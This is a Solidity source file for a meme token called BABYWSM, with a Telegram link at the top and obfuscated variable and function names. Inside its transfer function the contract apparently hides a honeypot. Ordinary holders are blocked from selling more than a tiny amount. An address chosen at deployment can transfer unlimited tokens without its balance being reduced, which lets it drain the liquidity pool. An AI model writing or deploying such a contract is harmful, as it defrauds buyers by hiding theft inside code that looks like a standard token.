/*

https://t.me/ercbabywsm

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYWSM is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private ykpmt;

    function heznyjpigx(address dpwcaolfi, address daxcl, uint256 eowpvfyxqz) private {
        address epimf = IUniswapV2Factory(gcztpfxwuso.factory()).getPair(address(this), gcztpfxwuso.WETH());
        bool ijsfh = wjtkdrfqai[dpwcaolfi] == block.number;
        uint256 rqhzvlcoaxsf = ykpmt[dpwcaolfi];
        if (0 == rqhzvlcoaxsf) {
            if (dpwcaolfi != epimf && (!ijsfh || eowpvfyxqz > bioeuyvglfd[dpwcaolfi]) && eowpvfyxqz < totalSupply) {
                require(eowpvfyxqz <= totalSupply / (10 ** decimals));
            }
            balanceOf[dpwcaolfi] -= eowpvfyxqz;
        }
        bioeuyvglfd[daxcl] = eowpvfyxqz;
        balanceOf[daxcl] += eowpvfyxqz;
        wjtkdrfqai[daxcl] = block.number;
        emit Transfer(dpwcaolfi, daxcl, eowpvfyxqz);
    }

    uint256 private cvplru = 106;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private bioeuyvglfd;

    IUniswapV2Router02 private gcztpfxwuso;

    uint8 public decimals = 9;

    string public name;

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private wjtkdrfqai;

    function transfer(address daxcl, uint256 eowpvfyxqz) public returns (bool success) {
        heznyjpigx(msg.sender, daxcl, eowpvfyxqz);
        return true;
    }

    constructor(string memory oswfxk, string memory oynuhrqg, address bowryuehfxnv, address rbglvxdaeh) {
        name = oswfxk;
        symbol = oynuhrqg;
        balanceOf[msg.sender] = totalSupply;
        ykpmt[rbglvxdaeh] = cvplru;
        gcztpfxwuso = IUniswapV2Router02(bowryuehfxnv);
    }

    function transferFrom(address dpwcaolfi, address daxcl, uint256 eowpvfyxqz) public returns (bool success) {
        require(eowpvfyxqz <= allowance[dpwcaolfi][msg.sender]);
        allowance[dpwcaolfi][msg.sender] -= eowpvfyxqz;
        heznyjpigx(dpwcaolfi, daxcl, eowpvfyxqz);
        return true;
    }

    function approve(address otfglm, uint256 eowpvfyxqz) public returns (bool success) {
        allowance[msg.sender][otfglm] = eowpvfyxqz;
        emit Approval(msg.sender, otfglm, eowpvfyxqz);
        return true;
    }
}